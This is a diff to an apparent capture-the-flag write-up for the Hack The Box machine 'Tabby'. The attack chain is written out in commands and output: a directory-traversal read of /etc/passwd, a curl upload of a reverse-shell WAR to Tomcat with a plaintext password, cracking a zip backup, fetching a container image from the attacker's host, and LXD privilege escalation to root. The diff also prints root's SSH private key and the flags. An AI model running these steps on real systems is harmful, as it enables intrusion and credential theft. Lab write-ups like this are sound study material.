@@ -116,7 +116,7 @@ Not Vulnerable to CVE-2017-12617
 ```
 
 
-* LFI discovered on for http://10.10.10.194
+* Identified Directory Traversal for http://10.10.10.194/news.php?file=statement Observed value in URL query strings that appear as file reference; filename is passed as input to the parameter file of the page news.php. OS information is crucial when exploiting a directory traversal.
 * Access http://10.10.10.194/news.php?file=../../../../../../etc/passwd
 ```
 
@@ -320,7 +320,7 @@ Saved as: reverse443.war
 ## Delivery & Exploitation
 * Deploy A New Application Archive (WAR) [Remotely](https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html)
 *  Curl Commands: -u, --user <user:password> Server user and password,-T, --upload-file <file> Transfer local FILE to destination
-* Need to upload via curl because we do not have manager-gui role and only manager-script role.
+* Upload via curl because we do not have manager-gui role and only manager-script role.
 
 ```
 kali@kali:~/HTB/tabby$ curl -u 'tomcat':'$3cureP4s5w0rd123!' -T reverse443.war 'http://10.10.10.194:8080/manager/text/deploy?path=/reverse443'
@@ -495,7 +495,7 @@ Writable: /var/log/tomcat9/catalina.2020-11-08.log
 -rw-r--r-- 1 root root 2743 Apr 23  2020 /etc/apt/sources.list.curtin.old
 ```
 
-* Used netcat to transfer the /var/www/html/files/16162020_backup.zip to local machine and crack the password.
+* Used netcat to transfer the /var/www/html/files/16162020_backup.zip to local machine and crack the password with john the ripper.
 ```
 kali@kali:~/HTB/tabby$ zip2john 16162020_backup.zip > ziphash
 16162020_backup.zip/var/www/html/assets/ is not encrypted!                                    
@@ -590,6 +590,14 @@ c1078b3d1b7c96fe4394817cc528e4f8
 /home/ash/.gnupg/pubring.kbx                                                                                      
 ```
 
+* Run LinEnum.sh
+
+```
+[+] We're a member of the (lxd) group - could possibly misuse these rights!
+uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
+```
+* More research on it reveal LXD controls the Linux Container (lxc). Possible for the user to create a privileged container and mount the host filesystem.
+
 ```
 ash@tabby:~$ wget http://10.10.14.12/alpine-v3.12-x86_64-20201108_2154.tar.gz                                     
 wget http://10.10.14.12/alpine-v3.12-x86_64-20201108_2154.tar.gz                                                  
@@ -652,8 +660,9 @@ lxc exec mycontainer /bin/sh
 ~ # ^[[29;5Rid
 id
 uid=0(root) gid=0(root)
-
-
+```
+* Extract SSH private key
+```
 cat /mnt/root/root/.ssh/id_rsa                                                                                    
 -----BEGIN OPENSSH PRIVATE KEY-----    
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
@@ -693,8 +702,9 @@ l+X4lL+UKnl7698EHnBHXVgjUCs9mtp+yfIC6he5jEZDZ65Cqrgk3x5zKDI43Rnp20IR7U
 gCbvoYLRxsyjAK1YX1NYsj3h8kXEvkNcLXPqzXEous/uu+C216jpsdvvt6kMKEBQaf6KMl
 yvVmXq7Xsj7XKQ2QAAAApyb290QGdob3N0AQIDBAUGBw==
 -----END OPENSSH PRIVATE KEY-----
-
-
+```
+* Create private SSH key on local machine and SSH into root@10.10.10.194
+```
 kali@kali:~/HTB/tabby/lxd-alpine-builder$ nano id_rsa
 kali@kali:~/HTB/tabby/lxd-alpine-builder$ chmod 400 id_rsa        
 kali@kali:~/HTB/tabby/lxd-alpine-builder$ ssh -i id_rsa root@10.10.10.194
@@ -746,3 +756,4 @@ vethe39319e5: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 
 root@tabby:~# cat /root/root.txt
 f8bb49c68a47f6d4b2f73ac51e032958
+```
